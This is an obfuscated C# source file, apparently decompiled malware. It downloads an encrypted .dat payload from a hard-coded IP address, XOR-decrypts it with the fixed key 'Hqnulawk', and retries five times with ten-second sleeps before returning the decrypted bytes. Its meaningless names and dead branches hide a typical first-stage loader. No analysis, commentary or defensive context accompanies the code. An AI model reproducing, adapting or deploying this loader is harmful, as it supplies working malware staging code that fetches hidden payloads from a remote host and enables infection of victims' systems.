using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

internal sealed class nly
{
	public nly()
	{
		_ = -1;
		if (7 == 0)
		{
		}
		base._002Ector();
	}

	private static byte[] ain(string mlm)
	{
		HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(mlm);
		HttpWebRequest httpWebRequest;
		if (5u != 0)
		{
			httpWebRequest = obj;
		}
		WebResponse response = httpWebRequest.GetResponse();
		WebResponse webResponse;
		if (5u != 0)
		{
			webResponse = response;
		}
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2;
		if (5u != 0)
		{
			memoryStream2 = memoryStream;
		}
		webResponse.GetResponseStream().CopyTo(memoryStream2);
		return memoryStream2.ToArray();
	}

	private static byte[] aio()
	{
		return ain("http://20.127.168.10/assets/Wfvglucfoy.dat");
	}

	internal static byte[] aip()
	{
		int i;
		if (true)
		{
			i = 0;
		}
		for (; i < 5; i++)
		{
			try
			{
				byte[] array = aio();
				byte[] array2;
				if (6u != 0)
				{
					array2 = array;
				}
				string s;
				if (7u != 0)
				{
					s = "Hqnulawk";
				}
				byte[] bytes = Encoding.ASCII.GetBytes(s);
				byte[] array3 = new byte[array2.Length];
				for (int j = 0; j < array2.Length; j++)
				{
					array3[j] = (byte)(bytes[j % bytes.Length] ^ array2[j]);
				}
				return array3;
			}
			catch
			{
				Thread.Sleep(TimeSpan.FromSeconds(10.0));
			}
		}
		return null;
	}
}
